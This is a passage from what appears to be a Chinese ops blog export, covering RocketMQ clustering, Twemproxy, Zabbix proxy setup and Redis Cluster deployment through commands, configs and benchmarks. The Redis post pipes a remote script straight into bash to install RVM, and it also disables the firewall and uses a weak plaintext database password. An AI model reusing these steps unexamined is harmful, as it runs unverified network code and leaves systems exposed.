B，启动第二个 Master在机器 C，启动第一个 Slave在机器 D，启动第二个 Slave以上 Broker 与 Slave 配对是通过指定相同的brokerName 参数来配对，Master的 BrokerId 必须是 0，Slave 的BrokerId 必须是大与 0 的数。另外一个 Master下面可以挂载多个 Slave，同一 Master 下的多个 Slave通过指定不同的 BrokerId来区分。 参考来源：RocketMQ集群方式 RocketMQ网络部署特点： 1234567Name Server 是一个几乎无状态节点，可集群部署，节点之间无任何信息同步。Broker部署相对复杂，Broker分为Master与Slave，一个Master可以对应多个Slave，但是一个Slave只能对应一个Master，Master与Slave的对应关系通过指定相同的BrokerName，不同的BrokerId来定义，BrokerId&#x3D;0表示Master，非0表示Slave。Master也可以部署多个。每个Broker与Name Server集群中的所有节点建立长连接，定时注册Topic信息到所有Name Server。Producer与Name Server集群中的其中一个节点（随机选择）建立长连接，定期从Name Server取Topic路由信息，并向提供Topic 服务的Master建立长连接，且定时向Master发送心跳。Producer 完全无状态，可集群部署。Consumer与Name Server集群中的其中一个节点（随机选择）建立长连接，定期从Name Server取Topic 路由信息，并向提供Topic服务的Master、Slave建立长连接，且定时向Master、Slave发送心跳。Consumer既可以从Master订阅消息，也可以从Slave订阅消息，订阅规则由Broker配置决定。 通过这篇“RocketMQ原理与实践”可以很容易理解，RocketMQ是如何解决 &lt;消息顺序&gt;和&lt;消息重复&gt;的。","categories":[],"tags":[{"name":"MQ","slug":"MQ","permalink":"https://garywu520.github.io/tags/MQ/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Producer","slug":"Producer","permalink":"https://garywu520.github.io/tags/Producer/"},{"name":"RocketMQ","slug":"RocketMQ","permalink":"https://garywu520.github.io/tags/RocketMQ/"},{"name":"Consumer","slug":"Consumer","permalink":"https://garywu520.github.io/tags/Consumer/"},{"name":"TOPIC","slug":"TOPIC","permalink":"https://garywu520.github.io/tags/TOPIC/"},{"name":"Name Server","slug":"Name-Server","permalink":"https://garywu520.github.io/tags/Name-Server/"}]},{"title":"Redis代理Twemproxy安装配置使用","slug":"Redis代理Twemproxy安装配置使用","date":"2017-11-13T10:29:37.000Z","updated":"2017-11-13T13:53:47.144Z","comments":true,"path":"2017/11/13/Redis代理Twemproxy安装配置使用/","link":"","permalink":"https://garywu520.github.io/2017/11/13/Redis%E4%BB%A3%E7%90%86Twemproxy%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8/","excerpt":"Twemproxy介绍 1Twemproxy 也叫 nutcraker。是 Twtter 开源的一个 Redis 和 Memcache 代理服务器，主要用于管理 Redis 和 Memcached 集群，减少与Cache 服务器直接连接的数量。","text":"Twemproxy介绍 1Twemproxy 也叫 nutcraker。是 Twtter 开源的一个 Redis 和 Memcache 代理服务器，主要用于管理 Redis 和 Memcached 集群，减少与Cache 服务器直接连接的数量。 Twemproxy特性 12345678910111213轻量级、快速保持长连接减少了直接与缓存服务器连接的连接数量使用 pipelining 处理请求和响应支持代理到多台服务器上同时支持多个服务器池自动分片数据到多个服务器上实现完整的 memcached 的 ASCII 和再分配协议通过 yaml 文件配置服务器池支持多个哈希模式，包括一致性哈希和分布能够配置删除故障节点可以通过端口监控状态支持 linux, *bsd,os x 和 solaris 注：以下配置基于redis集群部署，快速移步：Redis Cluster集群部署-实战1 环境准备1234567891011autoconf下载地址：http:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;autoconf&#x2F;autoconf-2.69.tar.gztwemproxy下载地址：https:&#x2F;&#x2F;codeload.github.com&#x2F;twitter&#x2F;twemproxy&#x2F;zip&#x2F;masterTwemproxy1: 10.0.10.25Twemproxy2: 10.0.10.26#安装编译环境yum groupinstall &quot;Development Tools&quot;#安装基本软件yum install unzip vim wget lrzsz 编译安装autoconf-2.69.tar.gz 1234tar -xf autoconf-2.69.tar.gzcd autoconf-2.69.&#x2F;configuremake &amp;&amp; make install 编译安装Twemproxy 123456unzip twemproxy-master.zip cd twemproxy-masterautoreconf -fvi.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;twemproxymake -j 8make install 配置Twemproxy1234cd &#x2F;usr&#x2F;local&#x2F;twemproxy&#x2F;mkdir run etccd etcvim twemproxy25.yml 配置文件-详解 123456789101112131415161718192021alpha: listen: 0.0.0.0:11111 hash: crc16 distribution: modula auto_eject_hosts: true backlog: 2048 redis: true server_retry_timeout: 200 server_failure_limit: 1 sds_rep: tcp:&#x2F;&#x2F;10.15.144.104:10300 sds_pub: tcp:&#x2F;&#x2F;10.15.144.104:10301 servers: - 127.0.0.1:7000:1:group1 server1 - 127.0.0.1:7001:1:group2 server2 - 127.0.0.1:7002:1:group3 server3 - 127.0.0.1:7003:1:group1 slaver1 - 127.0.0.1:7004:1:group2 slaver2 - 127.0.0.1:7005:1:group3 slaver3 - 10.15.144.37:2014:1:eval eval2 - 10.15.144.37:2014:1:eval eval3 - 10.15.144.37:9100:1:syncdb db1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263listentwemproxy监听的端口。可以以ip:port或name:port的形式来书写。 hash可以选择的key值的hash算法：&gt; one_at_a_time&gt; md5&gt; crc16&gt; crc32(crc32 implementation compatible with libmemcached)&gt; crc32a(correct crc32 implementation as per the spec)&gt; fnv1_64&gt; fnv1a_64&gt; fnv1_32&gt; fnv1a_32&gt; hsieh&gt; murmur&gt; jenkins如果没选择，默认是fnv1a_64。 hash_taghash_tag允许根据key的一个部分来计算key的hash值。hash_tag由两个字符组成，一个是hash_tag的开始，另外一个是hash_tag的结束，在hash_tag的开始和结束之间，是将用于计算key的hash值的部分，计算的结果会用于选择服务器。 例如：如果hash_tag被定义为”&#123;&#125;”，那么key值为&quot;user:&#123;user1&#125;:ids&quot;和&quot;user:&#123;user1&#125;:tweets&quot;的hash值都是基于”user1”，最终会被映射到相同的服务器。而&quot;user:user1:ids&quot;将会使用整个key来计算hash，可能会被映射到不同的服务器。distribution存在ketama、modula和random3种可选的配置。其含义如下：(1)ketamaketama一致性hash算法，会根据服务器构造出一个hash ring，并为ring上的节点分配hash范围。ketama的优势在于单个节点添加、删除之后，会最大程度上保持整个群集中缓存的key值可以被重用。 (2)modulamodula非常简单，就是根据key值的hash值取模，根据取模的结果选择对应的服务器。 (3)randomrandom是无论key值的hash是什么，都随机的选择一个服务器作为key值操作的目标。timeout单位是毫秒，是连接到server的超时值。默认是永久等待。 backlog监听TCP 的backlog（连接等待队列）的长度，默认是512。preconnect是一个boolean值，指示twemproxy是否应该预连接pool中的server。默认是false。redis是一个boolean值，用来识别到服务器的通讯协议是redis还是memcached。默认是false。 server_connections每个server可以被打开的连接数。默认，每个服务器开一个连接。 auto_eject_hosts是一个boolean值，用于控制twemproxy是否应该根据server的连接状态重建群集。这个连接状态是由server_failure_limit 阀值来控制。默认是false。 server_retry_timeout单位是毫秒，控制服务器连接的时间间隔，在auto_eject_host被设置为true的时候产生作用。默认是30000 毫秒。 server_failure_limit控制连接服务器的次数，在auto_eject_host被设置为true的时候产生作用。默认是2。 servers左半部分是一个pool中的服务器的地址、端口和权重的列表，中间一个空格，后半部分是一个可选的服务器的名字，如果提供服务器的名字，将会使用它决定server的次序，从而提供对应的一致性hash的hash ring。否则，将使用server被定义的次序 本例配置文件 12345678910111213141516twemproxy25: listen: 10.0.10.25:10000 hash: fnv1a_64 distribution: modula auto_eject_hosts: true redis: true timeout: 4000 server_retry_timeout: 30000 server_failure_limit: 5 servers: - 10.0.10.21:7021:1 10.0.10.21:7021 - 10.0.10.21:7024:1 10.0.10.21:7024 - 10.0.10.22:7022:1 10.0.10.22:7022 - 10.0.10.22:7025:1 10.0.10.22:7025 - 10.0.10.23:7023:1 10.0.10.23:7023 - 10.0.10.23:7026:1 10.0.10.23:7026 12345678910111213141516twemproxy26: listen: 10.0.10.26:10000 hash: fnv1a_64 distribution: modula auto_eject_hosts: true redis: true timeout: 4000 server_retry_timeout: 30000 server_failure_limit: 5 servers: - 10.0.10.21:7021:1 10.0.10.21:7021 - 10.0.10.21:7024:1 10.0.10.21:7024 - 10.0.10.22:7022:1 10.0.10.22:7022 - 10.0.10.22:7025:1 10.0.10.22:7025 - 10.0.10.23:7023:1 10.0.10.23:7023 - 10.0.10.23:7026:1 10.0.10.23:7026 分别启动Twemproxy服务 12345678910cd &#x2F;usr&#x2F;bin &amp;&amp; ln -s &#x2F;usr&#x2F;local&#x2F;twemproxy&#x2F;sbin&#x2F;nutcracker .&#x2F; #命令软链nutcracker -t -c &#x2F;usr&#x2F;local&#x2F;twemproxy&#x2F;etc&#x2F;twemproxy.yml #测试配置文件是否有语法错误#启动Twemproxynutcracker -d -c &#x2F;usr&#x2F;local&#x2F;twemproxy&#x2F;etc&#x2F;twemproxy.yml -p &#x2F;usr&#x2F;local&#x2F;twemproxy&#x2F;run&#x2F;redisproxy.pid -o &#x2F;usr&#x2F;local&#x2F;twemproxy&#x2F;run&#x2F;redisproxy.log#检查启动情况ps -ef |grep nutcrackernetstat -lntup |grep 10000tailf &#x2F;usr&#x2F;local&#x2F;twemproxy&#x2F;run&#x2F;redisproxy.log Twemproxy使用 1234567891011121314151617[root@Twemproxy26 etc]# nutcracker --helpThis is nutcracker-0.4.1Options:-h, –help : 查看帮助文档，显示命令选项-V, –version : 查看nutcracker版本-t, –test-conf : 测试配置脚本的正确性-d, –daemonize : 以守护进程运行-D, –describe-stats : 打印状态描述-v, –verbosity&#x3D;N : 设置日志级别 (default: 5, min: 0, max: 11)-o, –output&#x3D;S : 设置日志输出路径，默认为标准错误输出 (default: stderr)-c, –conf-file&#x3D;S : 指定配置文件路径 (default: conf&#x2F;nutcracker.yml)-s, –stats-port&#x3D;N : 设置状态监控端口，默认22222 (default: 22222)-a, –stats-addr&#x3D;S : 设置状态监控IP，默认0.0.0.0 (default: 0.0.0.0)-i, –stats-interval&#x3D;N : 设置状态聚合间隔 (default: 30000 msec)-p, –pid-file&#x3D;S : 指定进程pid文件路径，默认关闭 (default: off)-m, –mbuf-size&#x3D;N : 设置mbuf块大小，以bytes单位 (default: 16384 bytes) 连接Twemproxy 12345678和连接redis一样的操作[root@localhost ~]# redis-cli -h 10.0.10.25 -p 10000 -c10.0.10.25:10000&gt; set name2 wuyanteng-&gt; Redirected to slot [742] located at 10.0.10.21:7021OK10.0.10.21:7021&gt; get name2&quot;wuyanteng&quot;10.0.10.21:7021&gt; 12345678[root@localhost ~]# redis-cli -h 10.0.10.26 -p 10000 -c10.0.10.26:10000&gt; 10.0.10.26:10000&gt; 10.0.10.26:10000&gt; set garywu wuyantengOK10.0.10.26:10000&gt; get garywu&quot;wuyanteng&quot;10.0.10.26:10000&gt; 性能压力测试 12345678910111213141516171819用redis自带的redis-benchmark进行性能测试Twemproxy[root@localhost ~]# redis-benchmark -h 10.0.10.25 -p 10000 -c 100 -t set -d 500&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; SET &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 100000 requests completed in 2.17 seconds 100 parallel clients 500 bytes payload keep alive: 19.25% &lt;&#x3D; 1 milliseconds79.36% &lt;&#x3D; 2 milliseconds79.40% &lt;&#x3D; 3 milliseconds82.94% &lt;&#x3D; 4 milliseconds91.81% &lt;&#x3D; 5 milliseconds99.84% &lt;&#x3D; 6 milliseconds99.97% &lt;&#x3D; 7 milliseconds100.00% &lt;&#x3D; 8 milliseconds100.00% &lt;&#x3D; 8 milliseconds46125.46 requests per second 原生redis: 123456789101112131415161718[root@localhost ~]# redis-benchmark -h 10.0.10.22 -p 7022 -c 100 -t set -d 500&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; SET &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 100000 requests completed in 2.62 seconds 100 parallel clients 500 bytes payload keep alive: 14.79% &lt;&#x3D; 1 milliseconds56.33% &lt;&#x3D; 2 milliseconds81.89% &lt;&#x3D; 3 milliseconds91.51% &lt;&#x3D; 4 milliseconds98.59% &lt;&#x3D; 5 milliseconds99.76% &lt;&#x3D; 6 milliseconds99.91% &lt;&#x3D; 7 milliseconds99.98% &lt;&#x3D; 8 milliseconds100.00% &lt;&#x3D; 9 milliseconds100.00% &lt;&#x3D; 9 milliseconds38167.94 requests per second","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis代理","slug":"redis代理","permalink":"https://garywu520.github.io/tags/redis%E4%BB%A3%E7%90%86/"},{"name":"memcache代理","slug":"memcache代理","permalink":"https://garywu520.github.io/tags/memcache%E4%BB%A3%E7%90%86/"},{"name":"Twitter","slug":"Twitter","permalink":"https://garywu520.github.io/tags/Twitter/"},{"name":"redis-benchmark","slug":"redis-benchmark","permalink":"https://garywu520.github.io/tags/redis-benchmark/"},{"name":"Twemproxy","slug":"Twemproxy","permalink":"https://garywu520.github.io/tags/Twemproxy/"}]},{"title":"zabbix监控高级-进阶2","slug":"zabbix监控高级-进阶2","date":"2017-11-12T01:43:24.000Z","updated":"2017-11-14T09:41:27.398Z","comments":true,"path":"2017/11/12/zabbix监控高级-进阶2/","link":"","permalink":"https://garywu520.github.io/2017/11/12/zabbix%E7%9B%91%E6%8E%A7%E9%AB%98%E7%BA%A7-%E8%BF%9B%E9%98%B62/","excerpt":"zabbix监控Windows zabbix监控Windows 12345678910#导出windows性能计数器key，cmd命令行输入如下指令：typeperf -qx &gt; c:\\windows-item.txt#进入指定目录安装、启动C:\\zabbix_agents_3.0.0.win\\bin\\win64&gt;zabbix_agentd.exe --installC:\\zabbix_agents_3.0.0.win\\bin\\win64&gt;zabbix_agentd.exe --startC:\\zabbix_agents_3.0.0.win\\bin\\win64&gt;zabbix_agentd.exe --stop#配置zabbix_agent.conf指定zabbix server地址Server&#x3D;192.168.56.11,192.168.11.211","text":"zabbix监控Windows zabbix监控Windows 12345678910#导出windows性能计数器key，cmd命令行输入如下指令：typeperf -qx &gt; c:\\windows-item.txt#进入指定目录安装、启动C:\\zabbix_agents_3.0.0.win\\bin\\win64&gt;zabbix_agentd.exe --installC:\\zabbix_agents_3.0.0.win\\bin\\win64&gt;zabbix_agentd.exe --startC:\\zabbix_agents_3.0.0.win\\bin\\win64&gt;zabbix_agentd.exe --stop#配置zabbix_agent.conf指定zabbix server地址Server&#x3D;192.168.56.11,192.168.11.211 1234567891011#添加windows主机#测试取值zabbix_get -s 192.168.56.11 -k perf_counter[&quot;\\Process(Idle)\\% Processor Time&quot;]#添加自定义监控项：方式1：把自定义key写入到配置文件内（不推荐）方式2：windows 监控项内添加zabbix web界面的windows模板key中:key: perf_counter[&quot;\\Process(Idle)\\% Processor Time&quot;]#zabbix Web界面查看刚刚添加的最新数据 zabbix agent主动与被动-数据收集1234567默认即被动数据收集，即Server轮询向agent索要数据。主动模式数据收集,即客户端agent定时向Server上报数据，新增配置如下：ServerActive&#x3D;192.168.56.11Hostname&#x3D;&quot;实际agent主机名&quot;注：zabbix agent的主动与被动模式可以同时并存 模板克隆+批量更新agent监控类型 123(1)客户端改为agent主动数据收集模式后，zabbix无主动模式的模板，这时候可以完全克隆一个模板，如：Temple OS Linux的模板克隆后名称定义为：Temple OS Linux Active.(2)然后批量修改克隆后的模板监控项类型为 zabbix agent(active) (3)最后修改主机使用的模板为Temple OS Linux Active即可 zabbix分布式监控之zabbix-proxy zabbix-proxy介绍 1234Zabbix Proxy 可以代替 Zabbix Server 检索客户端的数据，然后把数据汇报给 Zabbix Server，并且在一定程度上分担了 Zabbix Server 的压力。Zabbix Proxy 可以非常简便的实现了集中式、分布式监控。Zabbix Proxy 是一个数据收集器，它不计算触发器、不处理事件、不发送报警。其端口号与server一样均为：10051 zabbix-proxy使用场景 1234监控远程区域设备监控本地网络不稳定区域当 Zabbix 监控上千设备时，使用它来减轻 Server 的压力简化 Zabbix 的维护 注意事项： 12345678(1)Zabbix Proxy需要数据库支持，并且必须和 Zabbix Server 分开，否则数据会被破坏，因为这两个数据库的表大部分都相同。(2)Zabbix Proxy 收集到数据之后，首先将数据缓存在本地，然后在一定的时间之后传递给 Zabbix Server。这个时间由 Zabbix Proxy 配置文件中参数 ProxyLocalBuffer and ProxyOfflineBuffer 决定。(3)客户端使用agent active模式时，一定要记住在agent的配置文件参数ServerActive加上proxy的IP地址。切记！(4)提前规划，尽量确保zabbix-server&#x2F;zabbix-agent&#x2F;zabbix-proxy&#x2F;zabbix-get等版本一致，否则会出现无法预知的错误 源码安装zabbix-proxy 12345678910111213141516171819#下载wget http:&#x2F;&#x2F;pkgs.fedoraproject.org&#x2F;repo&#x2F;pkgs&#x2F;zabbix&#x2F;zabbix-3.0.0.tar.gz&#x2F;fd4032444711ebb45e92b4cd54a354c6&#x2F;zabbix-3.0.0.tar.gz#安装 zabbix 编译编译环境yum -y install mysql-devel libxml2-devel net-snmp-devel libcurl-devel php-mysql libXpm php-bcmath php-gd php-mbstring php-xml t1lib gcc open-ssl#源码编译yum install -y curl-devel net-snmp-develgroupadd zabbix &amp;&amp; useradd -g zabbix zabbixtar -zxvf zabbix-3.0.0.tar.gz &amp;&amp; cd zabbix-3.0.0.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;zabbix --enable-agent --enable-proxy --enable-get --with-mysql --with-net-snmp --with-libcurl --with-libxml2make &amp;&amp; make install#配置环境变量cd &#x2F;usr&#x2F;bin &amp;&amp; ln -s &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;bin&#x2F;* .&#x2F;cd &#x2F;usr&#x2F;sbin &amp;&amp; ln -s &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;sbin&#x2F;* .&#x2F;#创建zabbix用户useradd zabbix -s &#x2F;sbin&#x2F;nologin -M 安装MariaDB 12345678yum install -y mariadb*#启动MariaDBsystemctl restart mariadbsystemctl status mariadb#初始化MariaDBmysql_secure_installation #初始密码空 12345#创建数据库并授权create database zabbix_proxy;grant all on zabbix_proxy.* to &#39;root&#39;@&#39;192.168.56.%&#39; identified by &#39;12345&#39;;flush privileges;quit; 导入zabbix默认数据库文件 1mysql -uroot -p12345 zabbix_proxy &lt; zabbix-3.0.0&#x2F;database&#x2F;mysql&#x2F;schema.sql #导入proxy数据文件 修改zabbix_proxy配置文件 123456789Server&#x3D;192.168.56.11 #zabbix服务端IP，注意是ServerIPHostname&#x3D;zabbix_proxy #必须和WEB页面添加代理时设置的名称一致LogFile&#x3D;&#x2F;var&#x2F;log&#x2F;zabbix_proxy.log #日志文件路径DBHost&#x3D;192.168.56.13 #zabbix_proxy数据库IPDBName&#x3D;zabbix_proxy #zabbix_proxy数据库名DBUser&#x3D;root #zabbix_proxy数据库用户名DBPassword&#x3D;12345 #zabbix_proxy数据库密码ConfigFrequency&#x3D;60 #配置文件同步间隔DataSenderFrequency&#x3D;5 #数据同步间隔 12touch &#x2F;var&#x2F;log&#x2F;zabbix_proxy.logchown -R zabbix.zabbix &#x2F;var&#x2F;log&#x2F;zabbix_proxy.log 启动zabbix_Proxy服务 1zabbix_proxy -c &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;etc&#x2F;zabbix_proxy.conf 此时，便可以在zabbix管理站点上配置proxy了，方法如下： 添加proxy节点 管理 – agent代理程序 – 创建代理 123456agent代理程序名称： 需要与zabbix_proxy节点配置文件中定义的Hostname一致proxy mode: 选择proxy模式，zabbix proxy默认为主动模式 填写zabbix_proxy节点的IP地址与端口号,zabbix_proxy端口号为10051 主机： 此处不建议批量添加，往下看 描述： 描述清楚节点位置、用途等即可 在主机中修改-节点代理信息 1.修改指定主机的agent配置文件 12将&quot;Server&#x3D;192.168.56.11&quot; 改为zabbix_proxy的 “Server&#x3D;192.168.56.13”重启agent服务 2.在zabbix_proxy节点测试获取主机值 12zabbix_get -s 192.168.56.12 -p 10050 -k &quot;agent.ping&quot; #返回数字1说明OK1 3.配置 – 主机 – 搜索找到要变更的主机 – 点击进入 1由agent代理程序检测: 选择指定的zabbix_proxy代理 ---- 更新","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"zabbix-server","slug":"zabbix-server","permalink":"https://garywu520.github.io/tags/zabbix-server/"},{"name":"zabbix-agent","slug":"zabbix-agent","permalink":"https://garywu520.github.io/tags/zabbix-agent/"},{"name":"zabbix-proxy","slug":"zabbix-proxy","permalink":"https://garywu520.github.io/tags/zabbix-proxy/"},{"name":"zabbix windows","slug":"zabbix-windows","permalink":"https://garywu520.github.io/tags/zabbix-windows/"}]},{"title":"Redis Cluster集群部署-实战1","slug":"Redis-Cluster集群部署-实战1","date":"2017-11-07T06:44:20.000Z","updated":"2019-09-20T03:34:14.408Z","comments":true,"path":"2017/11/07/Redis-Cluster集群部署-实战1/","link":"","permalink":"https://garywu520.github.io/2017/11/07/Redis-Cluster%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2-%E5%AE%9E%E6%88%981/","excerpt":"","text":"环境 1234567891011121314OS: CentOS 7每台机器启用两个redis实例：Redis21：10.0.10.21 7021Redis22：10.0.10.22 7022Redis23：10.0.10.23 7023Redis21：10.0.10.21 7024Redis22：10.0.10.22 7025Redis23：10.0.10.23 7026Redis30：10.0.10.24 7027Redis30：10.0.10.24 7028Redis部署方式：编译Redis版本：官网最新稳定版 redis-stable.tar.gz 安装编译工具 1234(1) 安装GCC编译工具 yum install -y gcc g++ gcc-c++ make tcl(2) 关闭firewall systemctl stop firewalld.service &amp;&amp; systemctl disable firewalld.service Redis集群部署 编译安装redis【全节点部署】 1234tar xzf redis-stable.tar.gzcd redis-stablemakemake PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;redis install 配置redis【全节点部署】 1234mkdir &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc -p #创建配置文件目录cp &#x2F;root&#x2F;redis-stable&#x2F;redis.conf &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F; #拷贝默认redis配置文件cd &#x2F;usr&#x2F;bin&#x2F; &amp;&amp; ln -s &#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin&#x2F;redis* .&#x2F; #配置环境变量mkdir &#x2F;var&#x2F;log&#x2F;redis -p #创建redis日志目录 创建redis配置文件【每节点操作】 1注：待会要创建redis集群，而配置文件不需要配置主从关系。所以每个节点配置基本一致。除了监听的IP和端口不同。 123cd &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etcmv redis.conf redis.conf.bakvim redis-site.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687##是否以守护进程方式运行daemonize nopidfile &#x2F;var&#x2F;run&#x2F;redis-site.pidport 7022#高并发环境下你需要一个高backlog值来避免慢客户端连接问题tcp-backlog 511 bind 10.0.10.22#客户端空闲关闭时间timeout 0#设置SO_KEEPALIVE选项来向空闲连接的客户端发送ACKtcp-keepalive 0#指定日志记录级别loglevel notice#指明日志文件名logfile &quot;&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis.log&quot;#redis日志记录到系统日志## syslog-enabled no#redis日志在系统日志中的标识## syslog-ident redis#指定数据库个数databases 16#指定rdb快照频率#save &quot;&quot;save 900 1save 300 10save 60 100000#默认如果开启RDB快照(至少一条save指令)并且最新的后台保存失败，Redis将会停止接受写操作stop-writes-on-bgsave-error yes #指定存储至本地数据库时是否压缩数据，默认为yesrdbcompression yes#生成的关闭校验的RDB文件有一个0的校验和，它将告诉加载代码跳过检查rdbchecksum yes #指定本地数据库文件名，默认值为dump.rdbdbfilename dump.rdb#指定本地数据库存放目录dir .&#x2F;#设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步#slaveof x.x.x.x 6379#设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过AUTH &lt;password&gt;命令提供密码，默认关闭## masterauth &lt;master-password&gt;# 主从同步。通过 slaveof 指令来实现Redis实例的备份slave-serve-stale-data yes # 从Redis2.6默认所有的slave为只读slave-read-only yes # 在slave套接字发送SYNC之后禁用 TCP_NODELAY repl-diskless-sync no#客户端最大连接数#maxclients 10000##指定Redis最大内存限制maxmemory 40gb#指定是否在每次更新操作后进行日志记录appendonly no#指定更新日志文件名，默认为appendonly.aofappendfilename &quot;appendonly.aof&quot;#指定更新日志条件## appendfsync alwaysappendfsync everysec## appendfsync no#当hash只有少量的entry时，并且最大的entry所占空间没有超过指定的限#制时，会用一种节省内存的 数据结构来编码。可以通过下面的指令来设定限制hash-max-ziplist-entries 512hash-max-ziplist-value 64# 与hash似，数据元素较少的list，可以用另一种方式来编码从而节省大量空间。# # 这种特殊的方式只有在符合下面限制时才可以用list-max-ziplist-entries 512list-max-ziplist-value 64#重建hash表的时候如果内存不足 如果此值设置为no则延时，如果为yes则尽快释放内存activerehashing yes#一个任务可以使用的cpu数目hz 10#当一个子进程重写AOF文件时，如果启用下面的选项，则文件每生成32M数据会被同步。为了增量式写入硬盘并且避免大的延迟高峰这个指令是非常有用的aof-rewrite-incremental-fsync yes#发送个slave的命令缓存大小repl-backlog-size 10gb#单次会话允许最大量#client-output-buffer-limit normal 0 0 0#client-output-buffer-limit pubsub 32mb 8mb 60#client-output-buffer-limit slave 256mb 64mb 60#集群配置cluster-enabled yes #开启集群cluster-config-file nodes.conf #保存节点配置，自动创建，自动更新cluster-node-timeout 5000 #集群超时时间 启动服务【每节点操作】 123456789 #分别启动服务nohup redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;redis.conf 2&gt;&#x2F;dev&#x2F;null &amp; nohup redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;redis-site.conf 2&gt;&#x2F;dev&#x2F;null &amp; #查看进程和端口ps -ef |grep redis#查看log信息[root@localhost ~]# tailf &#x2F;var&#x2F;log&#x2F;redis&#x2F;redis.log 解决log错误 1234报错：13395:M 07 Nov 02:31:59.980 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &#39;vm.overcommit_memory &#x3D; 1&#39; to &#x2F;etc&#x2F;sysctl.conf and then reboot or run the command &#39;sysctl vm.overcommit_memory&#x3D;1&#39; for this to take effect.13395:M 07 Nov 02:31:59.980 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &#39;echo never &gt; &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabled&#39; as root, and add it to your &#x2F;etc&#x2F;rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.2060:M 07 Nov 03:06:16.211 # WARNING: The TCP backlog setting of 511 cannot be enforced because &#x2F;proc&#x2F;sys&#x2F;net&#x2F;core&#x2F;somaxconn is set to the lower value of 128. 解决方法(纯属翻译)： 123456789101112131415161718echo &quot;vm.overcommit_memory &#x3D; 1&quot; &gt;&gt;&#x2F;etc&#x2F;sysctl.confsysctl vm.overcommit_memory&#x3D;1echo &quot;1024&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;core&#x2F;somaxconnecho &quot;never&quot; &gt; &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabledcat &gt;&gt; &#x2F;etc&#x2F;rc.d&#x2F;rc.local &lt;&lt; EOFecho &quot;1024&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;core&#x2F;somaxconn#禁用THPif test -f &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabled; then echo never &gt; &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabledfiif test -f &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;defrag; then echo never &gt; &#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;defragfiEOF重启虚拟机并重启redis服务 重启服务【全节点】 12345&gt;&#x2F;var&#x2F;log&#x2F;redis&#x2F;redis.log #分别启动服务nohup redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;redis.conf 2&gt;&#x2F;dev&#x2F;null &amp; nohup redis-server &#x2F;usr&#x2F;local&#x2F;redis&#x2F;etc&#x2F;redis-site.conf 2&gt;&#x2F;dev&#x2F;null &amp; Redis集群创建 安装ruby【所有节点】 12345678910111213141516yum -y install ruby ruby-devel rubygems rpm-build#安装RVM(升级ruby为2.4.0)curl -sSL https:&#x2F;&#x2F;rvm.io&#x2F;mpapis.asc | gpg --import -curl -L get.rvm.io | bash -s stablesource &#x2F;etc&#x2F;profile.d&#x2F;rvm.shrvm reloadrvm requirements runrvm install 2.4.0#设置默认ruby版本rvm listrvm use 2.4.0 --defaultruby --version#安装redis模块（否则后面横向扩展redis节点会不成功）gem install redis 创建集群【只在10.0.10.21上面创建即可】 1234567891011121314151617cd &#x2F;root&#x2F;redis-stable&#x2F;src #进入源码目录.&#x2F;redis-trib.rb create --replicas 1 \\10.0.10.21:7021 \\10.0.10.22:7022 \\10.0.10.23:7023 \\10.0.10.21:7024 \\10.0.10.22:7025 \\10.0.10.23:7026 #注：上面的6个节点中，前3个节点被配置成了master，而其他的则为slave从节点--可以通过cluster info查看。注意：这个主从并未在配置文件中做，而是通过专属redis集群管理工具来创建的。根据提示，交互输入: yes[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 集群验证 